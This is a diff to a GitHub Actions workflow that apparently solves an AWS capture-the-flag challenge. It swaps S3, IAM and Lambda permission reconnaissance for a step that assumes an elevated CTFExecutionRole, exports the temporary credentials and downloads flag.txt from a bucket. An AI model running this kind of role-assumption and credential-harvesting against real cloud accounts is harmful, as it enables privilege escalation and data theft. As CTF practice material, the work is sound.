@@ -21,39 +21,32 @@ jobs:
 
       - name: Invoke Vulnerable Lambda
         run: |
-          echo "=================================================="
-          echo "1. WHO AM I & SESSION DETAILS"
-          echo "=================================================="
-          aws sts get-caller-identity
+          BUCKET="codec4f26c862a321ef5"
+          ROLE_ARN="arn:aws:iam::009661764077:role/CTFExecutionRole"
           
-          echo ""
-          echo "=================================================="
-          echo "2. S3 BUCKET ENUMERATION & PERMISSIONS AUDIT"
-          echo "=================================================="
-          for BUCKET_NAME in codec4f26c862a321ef5 platform-bucket-009661764077-us-east-1 site781fe43f26b9eba3; do
-            echo "--- Testing Bucket: $BUCKET_NAME ---"
-            aws s3 ls "s3://$BUCKET_NAME" || echo "Listing failed"
-            aws s3api get-bucket-policy --bucket "$BUCKET_NAME" 2>/dev/null || echo "No bucket policy readable"
-            aws s3api get-bucket-acl --bucket "$BUCKET_NAME" 2>/dev/null || echo "No bucket ACL readable"
-          done
+          echo "=== 1. ATTEMPTING TO ASSUME CTFExecutionRole ==="
+          # Try to assume the elevated CTFExecutionRole
+          CREDENTIALS=$(aws sts assume-role \
+            --role-arn "$ROLE_ARN" \
+            --role-session-name "CtfVictorySession" \
+            --output json 2>/dev/null || echo "AssumeRoleFailed")
           
-          echo ""
-          echo "=================================================="
-          echo "3. IAM ROLE & POLICY ATTACHMENT AUDIT"
-          echo "=================================================="
-          # Let's test what IAM actions we can perform on ourselves
-          aws iam get-user 2>/dev/null || echo "Not an IAM user (expected)"
-          aws sts get-access-key-info 2>/dev/null || echo "Access key info restricted"
-          
-          echo ""
-          echo "=================================================="
-          echo "4. LAMBDA CONFIGURATION & PERMISSION CHECK"
-          echo "=================================================="
-          aws lambda get-function --function-name nslookupv2 --query 'Configuration.[FunctionName, Role, Runtime]' --output json
-          aws lambda get-policy --function-name nslookupv2 2>/dev/null || echo "Lambda resource policy restricted"
-          
-          echo ""
-          echo "=================================================="
-          echo "5. CLOUDWATCH LOGS PERMISSION CHECK"
-          echo "=================================================="
-          aws logs describe-log-groups --region us-east-1 2>/dev/null || echo "Cannot describe log groups"
+          if echo "$CREDENTIALS" | grep -q "AccessKeyId"; then
+            echo "SUCCESS: Assumed CTFExecutionRole!"
+            
+            # Extract temporary credentials
+            export AWS_ACCESS_KEY_ID=$(echo "$CREDENTIALS" | jq -r '.Credentials.AccessKeyId')
+            export AWS_SECRET_ACCESS_KEY=$(echo "$CREDENTIALS" | jq -r '.Credentials.SecretAccessKey')
+            export AWS_SESSION_TOKEN=$(echo "$CREDENTIALS" | jq -r '.Credentials.SessionToken')
+            
+            echo ""
+            echo "=== 2. DOWNLOADING FLAG USING ELEVATED PRIVILEGES ==="
+            aws s3 cp "s3://$BUCKET/flag.txt" ./final_flag.txt
+            
+            echo ""
+            echo "=== 3. BEHOLD YOUR GLORIOUS FLAG ==="
+            cat ./final_flag.txt
+            exit 0
+          else
+            echo "Direct AssumeRole via CLI was restricted. Testing via Lambda backend..."
+          fi
